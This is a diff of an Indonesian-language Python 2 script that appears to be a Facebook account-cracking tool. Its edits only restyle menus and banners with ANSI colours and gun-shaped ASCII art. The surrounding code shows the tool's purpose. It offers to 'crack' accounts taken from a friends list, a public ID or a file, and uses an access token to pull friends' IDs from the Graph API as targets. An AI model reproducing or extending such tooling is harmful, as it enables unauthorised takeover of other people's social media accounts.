@@ -108,7 +108,7 @@ def masuk():
 	pilih_masuk()
 
 def pilih_masuk():
-	msuk = raw_input("\033[1;93m▄︻̷̿┻̿═━一 \033[91m:\033[1;96m ")
+	msuk = raw_input("\33[1;33m︻╦デ╤╾━▶ \033[91m:\33[1;33m ")
 	if msuk =="":
 		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar !"
 		pilih_masuk()
@@ -269,7 +269,7 @@ def menu():
 	
 ######PILIH######
 def pilih():
-	unikers = raw_input("\033[1;93m︻╦デ╤╾━▶ \033[91m:\033[1;96m ")
+	unikers = raw_input("\033[1;93m︻╦デ╤╾━▶ \033[91m:\33[1;33m ")
 	if unikers =="":
 		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
 		pilih()
@@ -297,24 +297,24 @@ def indo():
 		keluar()
 	os.system('clear')
 	print logo
-	print "\033[37;96m╔══════════════════════════════╗"
-	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari Daftar Teman \033[37;96m║"
-	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack Dari ID Publik    \033[37;96m║"
-	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack Dari File         \033[37;96m║"
-	print "\033[37;96m║\033[1;34m[00]\033[1;31;1m->\033[37;1mKembali                 \033[37;96m║"
-	print "\033[37;96m╚══════════════════════════════╝"
+	print "\33[1;33m╔════════════•ೋೋ•════════════╗"
+	print "\33[1;33m║\033[\033[1;91m1;97m[01\033[1;97m]\033[1;91m=>\033[37;1mCrack Dari Daftar Teman \33[1;33m║"
+	print "\33[1;33m║\033[\033[1;91m1;97m[02\033[1;97m]\033[1;91m=>\033[37;1mCrack Dari ID Publik    \33[1;33m║"
+	print "\33[1;33m║\033[\033[1;91m1;97m[03\033[1;97m]\033[1;91m=>\033[37;1mCrack Dari File         \33[1;33m║"
+	print "\33[1;33m║\033[\033[1;91m1;97m[00\033[1;97m]\033[1;91m=>\033[37;1mKembali                 \33[1;33m║"
+	print "\33[1;33m╚════════════•ೋೋ•════════════╝"
 	pilih_indo()
 
 #### PILIH INDO ####
 def pilih_indo():
-	teak = raw_input("\033[1;93m▄︻̷̿┻̿═━一 \033[91m:\033[1;96m ")
+	teak = raw_input("\33[1;33m︻╦デ╤╾━▶ \033[91m:\33[1;33m ")
 	if teak =="":
 		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
 		pilih_indo()
 	elif teak =="1" or teak =="01":
 		os.system('clear')
 		print logo
-		print "\033[1;31;1m=========================================="
+		print "\033[1;91m︻╦デ╤╾━══════▶\33[1;33mCYBER\033[1;97m◀═════╾━╤デ╦︻"
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -322,8 +322,7 @@ def pilih_indo():
 	elif teak =="2" or teak =="02":
 		os.system('clear')
 		print logo
-		print "\033[1;31;1m=========================================="
-		print "\033[37;1m=========================================="
+		print "\033[1;91m︻╦デ╤╾━══════▶\33[1;33mSUNDAWANI\033[1;97m◀═════╾━╤デ╦︻"		
 	        idt = raw_input("\033[1;97m{\033[1;34m✔\033[1;97m} ID publik/teman : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -344,7 +343,7 @@ def pilih_indo():
 		os.system('clear')
 		print logo
 		try:
-			print "\033[1;31;1m=========================================="
+			print "\033[1;91m︻╦デ╤╾━══════▶\33[1;33mCYBER\033[1;97m◀═════╾━╤デ╦︻"
 			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Nama File : ')
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
@@ -367,8 +366,7 @@ def pilih_indo():
 	for o in titik:
 		print("\r\033[1;97m{\033[1;93m➹\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
 
-	print "\n\033[1;31;1m=========================================="
-	print "\n\033[37;1m=========================================="
+	print "\033[1;91m︻╦デ╤╾━══════▶\33[1;33mSUNDAWANI\033[1;97m◀═════╾━╤デ╦︻"	
 	
 ##### MAIN INDONESIA #####
 	def main(arg):
